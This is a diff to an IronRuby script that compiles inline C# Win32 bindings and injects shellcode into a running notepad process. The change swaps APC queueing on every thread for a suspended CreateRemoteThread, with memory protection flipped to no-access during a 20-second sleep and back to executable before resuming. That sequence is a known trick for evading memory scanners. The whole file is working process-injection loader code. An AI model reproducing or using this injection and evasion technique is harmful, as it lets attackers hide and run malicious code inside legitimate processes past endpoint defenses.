@@ -31,57 +31,23 @@ code = %@
     {        
         public class Injection
         {
-            public static UInt32 MEM_COMMIT = 0x1000;
-            public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-            public static UInt32 PAGE_READWRITE = 0x04;
-            public static UInt32 PAGE_EXECUTE_READ = 0x20;
-            
-            // Process privileges
-            public const int PROCESS_CREATE_THREAD = 0x0002;
-            public const int PROCESS_QUERY_INFORMATION = 0x0400;
-            public const int PROCESS_VM_OPERATION = 0x0008;
-            public const int PROCESS_VM_WRITE = 0x0020;
-            public const int PROCESS_VM_READ = 0x0010;
-            [Flags]
-            public enum ThreadAccess : int
-            {
-              TERMINATE = (0x0001),
-              SUSPEND_RESUME = (0x0002),
-              GET_CONTEXT = (0x0008),
-              SET_CONTEXT = (0x0010),
-              SET_INFORMATION = (0x0020),
-              QUERY_INFORMATION = (0x0040),
-              SET_THREAD_TOKEN = (0x0080),
-              IMPERSONATE = (0x0100),
-              DIRECT_IMPERSONATION = (0x0200),
-                THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
-                THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
-            }	
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
-                int dwThreadId);
-            
-            [DllImport("kernel32.dll",SetLastError = true)]
-            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
-            
-            [DllImport("kernel32.dll")]
-            public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
-            
-            [DllImport("kernel32")]
-            public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
-                 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
-            
-            [DllImport("kernel32.dll", SetLastError = true )]
-            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-            Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-            
-            [DllImport("kernel32.dll")]
-            public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
-            int dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint ResumeThread(IntPtr hThread);
         }
     }
  @
@@ -100,22 +66,24 @@ end
 targetProcess = System::Diagnostics::Process.GetProcessesByName("notepad")[0]
 assembly = generate(code)
 injection = assembly.get_types()[0]
-ThreadAccess = assembly.get_types()[1]
 
-params = System::Array[System::Object].new([injection.get_field('PROCESS_VM_OPERATION').get_raw_constant_value | injection.get_field('PROCESS_VM_WRITE').get_raw_constant_value | injection.get_field('PROCESS_VM_READ').get_raw_constant_value, false, targetProcess.Id])
+params = System::Array[System::Object].new([0x001F0FFF, false, targetProcess.Id])
 procHandle = injection.get_method('OpenProcess').invoke(nil, params)
-params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, shellcode.Length, injection.get_field('MEM_COMMIT').get_value('UInt32'), injection.get_field('PAGE_EXECUTE_READWRITE').get_value('UInt32')])
+mc = System::UInt32.new(0x3000)
+perw = System::UInt32.new(0x40)
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, shellcode.Length,  mc, perw])
 resultPtr = injection.get_method('VirtualAllocEx').invoke(nil, params)
 bytesWritten = System::IntPtr.Zero
 params = System::Array[System::Object].new([procHandle, resultPtr, shellcode, shellcode.Length, bytesWritten])
 resultBool = injection.get_method('WriteProcessMemory').invoke(nil, params)
 oldProtect = System::UInt32.new(0)
-params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, injection.get_field('PAGE_EXECUTE_READ').get_value('UInt32'), oldProtect])
+params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x01), oldProtect])
 resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
-puts "Running threads.."
-for thread in targetProcess.Threads
-    params = System::Array[System::Object].new([ThreadAccess.get_field('THREAD_HIJACK').get_raw_constant_value, false, thread.Id])
-    tHandle = injection.get_method('OpenThread').invoke(nil, params)
-    params = System::Array[System::Object].new([resultPtr, tHandle, System::IntPtr.Zero])		
-	ptr = injection.get_method('QueueUserAPC').invoke(nil, params)
-end
+thread_id = System::IntPtr.Zero
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, 0, resultPtr, System::IntPtr.Zero, 0x00000004, thread_id])
+hThread = injection.get_method('CreateRemoteThread').invoke(nil, params)
+System::Threading::Thread.Sleep(20000)
+params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x40), oldProtect])
+resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
+params = System::Array[System::Object].new([hThread])
+injection.get_method('ResumeThread').invoke(nil, params)
